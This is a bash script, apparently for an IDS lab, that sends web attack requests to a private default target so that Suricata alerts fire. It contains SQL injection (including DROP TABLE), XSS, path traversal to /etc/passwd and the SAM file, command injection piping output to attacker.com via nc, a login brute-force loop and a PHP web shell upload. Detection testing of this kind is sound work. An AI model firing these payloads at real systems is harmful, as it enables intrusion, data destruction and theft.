#!/bin/bash

# HTTP Attack Scenario
# Triggers web application attack detection rules

TARGET="${1:-172.20.0.50}"
BASE_URL="http://$TARGET"

echo "[*] HTTP Attack Scenario"
echo "[*] Target: $BASE_URL"
echo ""

echo "[1] SQL Injection - UNION SELECT..."
curl -s "$BASE_URL/login?user=admin&pass=' UNION SELECT * FROM users--" >/dev/null
sleep 1

echo "[2] SQL Injection - OR 1=1..."
curl -s "$BASE_URL/login?user=admin&pass=' OR '1'='1" >/dev/null
sleep 1

echo "[3] SQL Injection - DROP TABLE..."
curl -s "$BASE_URL/admin?cmd='; DROP TABLE users;--" >/dev/null
sleep 1

echo "[4] Cross-Site Scripting (XSS)..."
curl -s "$BASE_URL/search?q=<script>alert('XSS')</script>" >/dev/null
sleep 1

echo "[5] XSS with event handler..."
curl -s "$BASE_URL/comment?text=<img src=x onerror=alert('XSS')>" >/dev/null
sleep 1

echo "[6] Directory Traversal..."
curl -s "$BASE_URL/../../../../etc/passwd" >/dev/null
sleep 1

echo "[7] Directory Traversal - Windows style..."
curl -s "$BASE_URL/..\\..\\..\\windows\\system32\\config\\sam" >/dev/null
sleep 1

echo "[8] Command Injection..."
curl -s "$BASE_URL/ping?host=localhost;cat /etc/passwd" >/dev/null
sleep 1

echo "[9] Command Injection with pipe..."
curl -s "$BASE_URL/exec?cmd=ls | nc attacker.com 4444" >/dev/null
sleep 1

echo "[10] Admin panel brute force simulation..."
for i in {1..10}; do
    curl -s -X POST "$BASE_URL/admin/login" -d "user=admin&pass=password$i" >/dev/null
    sleep 0.5
done

echo ""
echo "[11] Web shell upload attempt..."
curl -s -X POST "$BASE_URL/upload.php" \
    -F "file=@/dev/null;filename=shell.php" \
    -F "cmd=<?php system(\$_GET['cmd']); ?>" >/dev/null

echo ""
echo "[12] Suspicious user agents..."
curl -s -A "sqlmap/1.0" "$BASE_URL/" >/dev/null
sleep 1
curl -s -A "nikto/2.1.6" "$BASE_URL/" >/dev/null
sleep 1
curl -s -A "Metasploit" "$BASE_URL/" >/dev/null

echo ""
echo "[*] HTTP attack scenario complete!"
echo "[*] Check Suricata alerts for web application attacks"
